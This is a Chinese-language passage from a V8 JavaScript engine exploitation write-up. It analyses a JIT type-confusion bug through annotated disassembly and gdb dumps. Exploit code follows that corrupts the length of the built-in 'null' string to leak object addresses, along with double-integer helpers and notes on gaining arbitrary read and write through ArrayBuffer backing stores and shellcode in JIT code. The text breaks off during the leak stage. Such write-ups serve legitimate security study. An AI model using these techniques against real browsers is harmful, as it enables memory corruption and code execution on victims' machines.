    0x35680eb86ce5   101  48bf51d860be00370000 REX.W movq rdi,0x3700be60d851    ;; object: 0x3700be60d851 
    0x35680eb86cef   111  488b75e8       REX.W movq rsi,[rbp-0x18]
    0x35680eb86cf3   115  488b7727       REX.W movq rsi,[rdi+0x27]
    0x35680eb86cf7   119  498b55a0       REX.W movq rdx,[r13-0x60]
    0x35680eb86cfb   123  b801000000     movl rax,0x1
    0x35680eb86d00   128  bb02000000     movl rbx,0x2
    0x35680eb86d05   133  e8f6eeefff     call ArgumentsAdaptorTrampoline  (0x35680ea85c00)    ;; code: BUILTIN
    0x35680eb86d0a   138  48b8112330abf6000000 REX.W movq rax,0xf6ab302311    ;; object: 0xf6ab302311 
    0x35680eb86d14   148  488be5         REX.W movq rsp,rbp
    0x35680eb86d17   151  5d             pop rbp
    0x35680eb86d18   152  c20800         ret 0x8
    0x35680eb86d1b   155  90             nop
### 结论
据此，我们可以得出结论，在JIT优化之后，会直接从n中取出直接取出自定义属性数组中，对应于某属性偏移的字段，而不做任何合法性校验。
## exploit
### test
    function Check() {
        n.xyz = 3.4766863919133141e-308;    // do not modify string map 
        n.xyz1 = 0x1821923f                 // do not modify hash value
        n.xyz2 = 0x7000                 // enlarge length of builtIn string 'null'
    }
    0x1c4269306d80     0  55             push rbp
    0x1c4269306d81     1  4889e5         REX.W movq rbp,rsp
    0x1c4269306d84     4  56             push rsi
    0x1c4269306d85     5  57             push rdi
    0x1c4269306d86     6  4883ec08       REX.W subq rsp,0x8
    0x1c4269306d8a    10  488b45f8       REX.W movq rax,[rbp-0x8]
    0x1c4269306d8e    14  488945e8       REX.W movq [rbp-0x18],rax
    0x1c4269306d92    18  488bf0         REX.W movq rsi,rax
    0x1c4269306d95    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]
    0x1c4269306d9c    28  7305           jnc 35  (0x1c4269306da3)
    0x1c4269306d9e    30  e83dbbf5ff     call StackCheck  (0x1c42692628e0)    ;; code: BUILTIN
    0x1c4269306da3    35  48b8d9b9fadec60a0000 REX.W movq rax,0xac6defab9d9    ;; object: 0xac6defab9d9 PropertyCell for 0x3b0974d0a4b9 
    0x1c4269306dad    45  488b400f       REX.W movq rax,[rax+0xf] //取出JSSet n
    0x1c4269306db1    49  49ba0064000004001900 REX.W movq r10,0x19000400006400
    0x1c4269306dbb    59  c4c1f96ec2     vmovq xmm0,r10
    0x1c4269306dc0    64  488b5807       REX.W movq rbx,[rax+0x7] // 取n的自定义属性数组
    0x1c4269306dc4    68  488b5b0f       REX.W movq rbx,[rbx+0xf] // 取n的xyz域，注意取域的时候，如果这个域代表的意义是一个整数值，就直接写入，如果代表的是一个指针，就要从指针再寻址写入。
    0x1c4269306dc8    72  c5fb114307     vmovsd [rbx+0x7],xmm0
    0x1c4269306dcd    77  488b5807       REX.W movq rbx,[rax+0x7] // 取n的自定义属性数组
    0x1c4269306dd1    81  c7431b3f922118 movl [rbx+0x1b],0x1821923f // 取n的xyz1域，注意这里要用一个整形数去完整替换，不然会变成一个HeapNum指针，而这个指针是可能访问到不能访问的内存，从而crash
    0x1c4269306dd8    88  488b4007       REX.W movq rax,[rax+0x7] // 取n的自定义属性数组
    0x1c4269306ddc    92  c7402300700000 movl [rax+0x23],0x7000 // 取n的xyz1域
    ...
    最终
    gdb-peda$ x/20gx $rax-1
    0x3067ec802240: 0x000025b0e3582309  0x0000000000000000
    0x3067ec802250: 0x000025b0e3582361->xyz 0x1821923f->xyz1  803b1506
    0x3067ec802260: 0x00007000->xyz2 00000000   0xdeadbeed6c6c756e
    ...
    0x1c4269306de3    99  48b8112380ec67300000 REX.W movq rax,0x3067ec802311    ;; object: 0x3067ec802311 
    0x1c4269306ded   109  488be5         REX.W movq rsp,rbp
    0x1c4269306df0   112  5d             pop rbp
    0x1c4269306df1   113  c20800         ret 0x8
### 字符串类型
    0x2b753502250:  0x00003182a4182361->null    0x00000000803b1506
    0x2b753502260:  0x00000004->length 00000000 0xdeadbeed 6c6c756e->"null"
    0x2b753502270:  0x00003182a4182361->object  0x00000000c5f6c42a
    0x2b753502280:  0x0000000600000000->length  0xdead 7463656a626f->"object"
    ...
    gdb-peda$ job 0x2b753502251
    #null
    gdb-peda$ job 0x2b753502271
    #object
### JSFunction
  * 表示JavaScript function的对象
    * 继承Object, HeapObject, JSReceiver, JSObject
      * 内存结构如下（在64位环境的情况下）  
  * 实际演示
    * 存放function f()在数组中
    * 用0xdeadbee查找这个数组的内存位置  
    * kCodeEntryOffset is a pointer to the JIT code (RWX area), many strategies to realize arbitrary code execution by writing shellcode before this
### JSArrayBuffer
#### ArrayBuffer and TypedArray
  * Originally ArrayBuffer
    * 一个可以直接从JavaScript访问内存的特殊数组
      * 但是，ArrayBuffer仅准备一个内存缓冲区
      * BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存  
      * 为了实际访问，有必要一起使用TypedArray或DataView  
    * 使用例子 (TypedArray版本)
      * 创建方法1，仅指定长度，初始化为零  
t_arr = new Uint8Array(128) //ArrayBuffer被创建在内部
      * 创建方法2，使用特定值初始化  
t_arr = new Uint8Array([4,3,2,1,0]) //ArrayBuffer被创建在内部
      * 创建方法3，事先构建缓冲区并使用它  
arr_buf = new ArrayBuffer(8);  
t_arr1 = new Uint16Array(arr_buf); //创建一个Uint16数组  
t_arr2 = new Uint16Array(arr_buf, 0, 4); //或者，您也可以指定数组的开始和结束位置
    * ArrayBuffer可以在不同的TypedArray之间共享
      * 它也可以用于double和int的类型转换
        * **类型转换的意义在于改变字节序列的解释，而不是转换**
        * 就像C语言的Union
      * BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存  
      * ①预先准备ArrayBuffer  
var ab = new ArrayBuffer(0x100);
      * ②向ArrayBuffer中写入一个Float64的值  
var t64 = new Float64Array(ab);  
t64[0] = 6.953328187651540e-310;//字节序列是0x00007fffdeadbeef  
**\-- >当某些地址在V8上泄露时，通常在大多数情况下被迫将其解释为双精度值，为了正确计算偏移量等，需要将其转换为整数值。
对于完成该转换，ArrayBuffer是最佳的**
      * ③从ArrayBuffer读取两个Uint32  
var t32 = new Uint32Array(ab);  
k = [t32[1],t32[0]]  
**\-- >k是6.953328187651540e-310,将字节序列按照4个字节去分开，然后解释为Uint32,于是得到:**  
**k=[0x00007fff，0xdeadbeef]**
#### JSArrayBuffer
  * 持有ArrayBuffer的对象
    * 继承Object，HeapObject，JSReceiver，JSObject
      * 内存结构如下（在64位环境的情况下）  
  * 实际演示
    * 存放TypedArray
    * 使用长度0x13370搜索ArrayBuffer的内存位置  
    * 在V8中，对象通常被存放在由GC管理的mapped区域，然而BackingStore是一个不被GC管理的区域，并且被存放在heap中(在图中，可以看到malloc块有prev_size和size成员）  
此外，由于它不是由GC管理的HeapObject，因此指向BackingStore的指针不是Tagged Value（末尾不能为1）  
    * 虽然在ArrayBuffer中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出BackingStore数组的范围。
    * 同样，如果您可以重写BackingStore指针，则可以读取和写入任意内存地址，这些是在exploit中常用的方法。  
### 工具类准备
主要是用于double和int值的转换
    // int->double
    // d2u(intaddr/0x100000000,intaddr&0xffffffff)
    function d2u(num1,num2){
        d = new Uint32Array(2);
        d[0] = num2;
        d[1] = num1;
        f = new Float64Array(d.buffer);
        return f[0];
    }
    // double->int
    // u2d(floataddr)
    function u2d(num){
        f = new Float64Array(1);
        f[0] = num;
        d = new Uint32Array(f.buffer);
        return d[1] * 0x100000000 + d[0];
    }
### leak ArrayBuffer和Function
  1. 触发漏洞，越界写null string的长度，写null string的value字段为obj
  2. charCodeAt读出null string的value内容，从而leak出来
        var ab = new ArrayBuffer(0x200);
    var n;
    ...
    function Ctor() {
     n = new Set();  
    }
    function Check(obj){
     n.xyz = 3.4766863919152113e-308; // do not modify string map
     n.xyz1 = 0x0; // do not modify the value
     n.xyz2 = 0x7000; // enlarge length of builtIn string 'null'
     n.xyz3 = obj; // leak the Object 
    }
    ...
    Ctor(); // 初始化n
    Check(ab); //写入ArrayBuffer到value字段
    // gdb-peda$ x/10gx 0x28767ae02240
    // 0x28767ae02240:  0x0000083475082309  0x0000000000000000
    // 0x28767ae02250:  0x0000083475082361  0x00000000803b1506
    // 0x28767ae02260:  0x0000700000000000  0x000004ea79906839->ArrayBuffer
    // 0x28767ae02270:  0x0000083475082361  0x00000000c5f6c42a
    // 0x28767ae02280:  0x0000000600000000  0xdead7463656a626f
    // gdb-peda$ job 0x000004ea79906839
    // 0x4ea79906839: [JSArrayBuffer]
    //  - map = 0x3bcf5fc82db1 [FastProperties]
    //  - prototype = 0xb3e9b805599
    //  - elements = 0x28767ae02241  [FAST_HOLEY_SMI_ELEMENTS]
    //  - internal fields: 2
    //  - backing_store = 0x55ba589d0640
    //  - byte_length = 512
    //  - properties = {